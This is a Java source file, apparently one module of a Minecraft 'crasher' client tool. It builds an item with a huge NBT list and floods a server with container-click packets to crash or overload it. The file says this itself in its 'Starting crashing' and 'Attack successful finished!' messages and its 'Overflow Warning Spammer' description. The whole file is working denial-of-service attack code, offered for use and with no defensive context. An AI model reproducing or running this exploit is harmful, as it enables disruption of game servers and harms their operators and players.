package us.whitedev.crashers.impl;

import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.ListTag;
import net.minecraft.nbt.StringTag;
import net.minecraft.network.protocol.game.ServerboundContainerClickPacket;
import net.minecraft.world.inventory.ClickType;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.item.Items;
import us.whitedev.crashers.Crasher;
import us.whitedev.helpers.PacketHelper;
import us.whitedev.utils.OptionType;
import us.whitedev.utils.OptionUtil;

import java.util.List;
import java.util.Optional;

public class Lux1 implements Crasher {
    public static boolean INVALID_TAG_ID = false;
    private static final String METHOD_NAME = "Lux1";
    private boolean enabled = false;

    @Override
    public void onMethod(String[] args) {
        int packets = Integer.parseInt(args[2]);
        int size = Integer.parseInt(args[3]);
        int mapSize = Integer.parseInt(args[4]);

        setEnabled(true);
        INVALID_TAG_ID = true;

        CompoundTag comp = new CompoundTag();
        ListTag listtag = new ListTag();

        Int2ObjectMap<ItemStack> int2objectmap = new Int2ObjectOpenHashMap<>();

        for (int i = 0; i < size; i++) listtag.add(new StringTag("redsignal"));
        comp.put("redsignal", listtag);
        ItemStack is = new ItemStack(Items.CHERRY_CHEST_BOAT, 1, Optional.of(comp));

        for (int i = 0; i < mapSize; ++i)
            int2objectmap.put(i, is);


        for (int i = 0; i < packets; i++)
            PacketHelper.send(new ServerboundContainerClickPacket(0, 0, 20, 0, ClickType.PICKUP_ALL, is, int2objectmap));

        msgHelper.sendMessage("Starting crashing with &f" + getName(), true);

        setEnabled(false);
        INVALID_TAG_ID = false;

        msgHelper.sendMessage("Attack &asuccessful &7finished!", true);
    }

    @Override
    public String getName() {
        return METHOD_NAME;
    }

    @Override
    public boolean getEnabled() {
        return enabled;
    }

    @Override
    public void setEnabled(boolean bool) {
        this.enabled = bool;
    }

    @Override
    public List<OptionUtil> getOptions() {
        return List.of(
                new OptionUtil("Power", OptionType.INTEGER),
                new OptionUtil("Size", OptionType.INTEGER),
                new OptionUtil("Map Size", OptionType.INTEGER)
        );
    }

    @Override
    public String getArgsUsage() {
        return "packets[34], size[1000], map-size[1]";
    }

    @Override
    public String getDescription() {
        return "Overflow Warning Spammer [PE Abuser]";
    }
}
